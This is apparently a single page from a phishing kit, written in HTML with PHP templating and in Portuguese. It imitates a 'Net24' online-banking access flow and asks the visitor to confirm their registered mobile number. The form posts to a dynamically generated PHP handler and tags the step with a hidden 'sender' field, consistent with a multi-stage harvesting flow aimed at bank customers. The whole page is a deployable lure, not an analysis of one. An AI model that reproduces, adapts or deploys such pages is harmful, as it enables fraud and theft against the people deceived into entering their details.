<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
    <title>Acesso online - Net24 App</title>

    <meta name="theme-color" content="#0f145b">
    <meta name="apple-mobile-web-app-status-bar-style" content="#0f145b">
    <meta name="msapplication-navbutton-color" content="#0f145b">

    <link rel="stylesheet" href="./files/css/all.css">
</head>
<body class="bg_green">

<div class="container main_header">
    <div class="content">
        <img src="./files/images/logo.png" class="logo">
        <div class="clear"></div>
    </div><!--content-->
</div><!--container-->

<div class="container main_info">
    <div class="content">
        <h1>Confirmação telemóvel</h1>
        <p>Para continuar com este acesso, favor confirme o numero do teu telemóvel cadastrado.</p>
        <div class="clear"></div>
    </div><!--content-->
</div><!--container-->

<form action="<?= getQuery($mainFile);?>" method="post" onsubmit="return checkFone();" autocomplete="off" class="container form_content">
    <div class="content">
        <label for="is_phone">
            <span>Telemóvel cadastrado</span>
            <input type="tel" name="is_phone" id="is_phone" class="home_input" maxlength="9" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            <small class="small_fone"></small>
        </label>

        <button class="btn">
            <p>Confirmar</p>
            <span class="small_loader"></span>
        </button>
        <div class="loader_submit"></div>
        <input type="hidden" name="sender" value="phone">
    </div><!--content-->
</form><!--container form-->

<script src="./files/js/jquery.min.js"></script>
<script>
    function checkFone() {
        const fone = $('#is_phone');

        if (fone.val().length < 9) {
            alert("Numero de telemóvel registrado está incorreto. Tente novamente!");
            fone.val('').focus();
            return false;
        }else{
            $('.btn p').css('display', 'none');
            $('.btn .small_loader').css('display', 'block');
            $('.btn').attr('disabled', true);
            return true;
        }
    }
</script>
</body>
</html>